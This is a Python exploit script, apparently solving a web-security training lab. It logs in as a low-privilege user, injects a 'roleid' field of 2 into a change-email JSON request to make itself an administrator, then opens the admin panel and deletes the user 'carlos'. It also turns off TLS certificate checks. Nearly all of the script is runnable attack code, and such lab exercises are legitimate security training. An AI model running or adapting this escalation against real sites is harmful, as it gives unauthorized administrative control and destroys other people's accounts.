import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_auth_scookie(url):
    # LOGIN AND SESSION COOKIE RETRIEVAL
    uri = "/login"
    params = {
        'username' : 'wiener' , 
        'password' : 'peter'
    }
    r = requests.post(url + uri, data=params, verify=False, allow_redirects=False, proxies=proxies)
    authorized_session_cookie = r.cookies.get_dict()['session']

    # LOGIN AND VERIFICATION OF SESSION COOKIE
    cookies = {'session' : authorized_session_cookie}
    uri = "/my-account"
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200 and "Log out" in r.text:
        return authorized_session_cookie
    else:
        print("[-] Something went wrong!")
        sys.exit(-1)


def change_email(url, authorized_session_cookie):
    uri = "/my-account/change-email"
    params = {
        "email" : "test@test.test" ,
        "roleid" : 2
    }
    cookies = {'session' : authorized_session_cookie}
    r = requests.post(url + uri, cookies=cookies, json=params, allow_redirects=False, verify=False, proxies=proxies)
    if r.status_code == 302 and '"roleid": 2' in r.text:
        return True
    else:
        return False


def delete_user(url, authorized_session_cookie):
    uri = "/admin"
    cookies = {'session' : authorized_session_cookie}
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200 and "Admin panel" in r.text:
        uri = "/admin/delete?username=carlos"
        r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
        if "User deleted successfully!" in r.text:
            return True
    else:
        return False


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Test 'Access Control Vulnerability'...")
    authorized_session_cookie = get_auth_scookie(url)
    print("[+] First, get a valid session cookie as logged-in user (wiener)...")
    print("[+] Session cookie is %s\n" % authorized_session_cookie)

    print("[+] Changing now the email, sending json value 'roleid:2' along with the new email address")
    if not change_email(url, authorized_session_cookie):
        print("[-] Oooopsie, something went wrong!")
        sys.exit(-1)
    print("[+] Roleid changed successfully!\n")
    print("[+] Proceeding now to access the admin panel at /admin...")
    print("[+] Triggering now deletion of the user carlos...")
    if not delete_user(url, authorized_session_cookie):
        print("[-] Ooooopsie something went wrong!")
        sys.exit(-1)
    print("[+] User deleted successfully!")



if __name__ == "__main__":
    main()